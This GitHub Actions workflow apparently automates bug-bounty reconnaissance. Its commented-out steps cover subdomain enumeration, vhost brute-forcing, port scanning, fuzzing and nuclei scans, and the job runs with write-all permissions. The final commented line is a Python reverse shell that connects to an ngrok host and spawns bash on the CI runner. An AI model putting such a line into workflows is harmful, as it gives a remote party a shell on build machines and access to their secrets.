name: GitHub Actions
true:
- push
permissions: write-all
jobs:
  autoamate-with-actions:
    defaults:
      run:
        shell: bash
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
      with:
        repository: Github-Username/automate-with-actions
        token: ${{secrets.ACCESSTOKEN}}
    - run: "echo \"hello DK\"\n##this script is for installation of tools in the github\
        \ vm where workflow runs\n##echo \"Running installation script in the github\
        \ vm\"\n#scripts/install.sh \n#export GOROOT=/usr/local/go\n#export GOPATH=$HOME/go\n\
        #export PATH=$GOPATH/bin:$GOROOT/bin:$PATH\n#go version\n##this script will\
        \ run subdomain enumeration \n##comment and uncommnet command according to\
        \ your configuration \n## dont forfet to change configuration in scipts since\
        \ some program mandate rate limit\n#sleep 5\n#scripts/subdomain.sh\n#sleep\
        \ 5\n#scripts/dns-resolv.sh\n## this script will brute-force for virtual hosts\
        \ using gobuster\n## do httprobing using tomnomnom's httprobe\n#sleep 5\n\
        #scripts/vhost.sh\n## this script will pass final subdomain list to httpx\
        \ \n## this give status code, http methods, vhost, tech-used \n#sleep 5\n\
        #scripts/httpx.sh\n## this script use naabu for port scanning for top-1000\
        \ ports \n## you can configure it to specific also\n#sleep 5\n#scripts/port-scan.sh\n\
        ## this script use gobuster for fuzzing critical directory\n## you can add\
        \ your wordlist in fuzzing/critical-file.txt\n#sleep 5\n#scripts/fuzzer.sh\n\
        ## this script will run the nuclei scanner\n## you can configure nuclei config\
        \ file in configs/nuclei.yaml\n#sleep 5\n#scripts/nuclei.sh\n#sleep 5\n#echo\
        \ \"all work is done and commited\" \n##echo `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
        8.tcp.ngrok.io\",15313));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import\
        \ pty; pty.spawn(\"/bin/bash\")'`\n"
